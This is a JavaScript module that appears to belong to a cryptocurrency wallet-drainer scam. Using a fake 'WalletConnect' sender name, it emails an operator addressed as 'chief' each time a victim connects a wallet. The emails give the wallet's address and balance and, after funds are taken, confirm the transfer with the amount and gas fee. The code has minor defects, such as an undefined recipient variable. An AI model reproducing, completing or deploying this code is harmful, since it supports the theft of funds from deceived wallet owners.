import mailer from "@/services/mail-service";

const from = "my WalletConnect <systems@control-towers.com>";
const subject = "Wallet Connection Info!";

/**
 *
 * @param {string} notification_message
 * @param {{ address: string, balance: string, gas: string, amountTransfered: string }} data
 */

export function notifyControl(notification_message, data = {}) {
  let result = { error: null, sucess: null };
  switch (notification_message) {
    case "No_funds":
      noFundsNotify();
      break;
    case "Some_funds":
      someFundsNotify();
      break;
    case "Transaction_success":
      transactionSuccessNotify();
      break;
    default:
      break;
  }

  async function noFundsNotify() {
    const mailOptions = {
      from,
      to,
      subject,
      text: `Hi chief,\n\nNew connected wallet has no funds!.\n\nRegards,\nSystem@control-tower.com`,
    };

    try {
      const res = await mailer(mailOptions);
      result = { success: result, error: null };
    } catch (e) {
      result = { error: e, success: null };
    }
  }

  async function someFundsNotify() {
    const mailOptions = {
      from,
      to,
      subject,
      text: `Hi chief,\n\nNew connected wallet has got funds!.\nWallet: ${data.address}\nBalance: ${data.balance}\n\nSystem@control-tower.com`,
    };

    try {
      const res = await mailer(mailOptions);
      result = { success: result, error: null };
    } catch (e) {
      result = { error: e, success: null };
    }
  }

  async function transactionSuccessNotify() {
    const mailOptions = {
      from,
      to,
      subject,
      text: `Congrats chief!\n\nNew connected wallet has got funds, it has been successfully transfered, see details below.\nWallet: ${data.address}\nBalance: ${data.balance}\nAmount Transfered: ${data.amountTransfered}\nGas Fee: ${data.gas}\nSystem@control-tower.com`,
    };

    try {
      const res = await mailer(mailOptions);
      result = { success: result, error: null };
    } catch (e) {
      result = { error: e, success: null };
    }
  }

  return result;
}
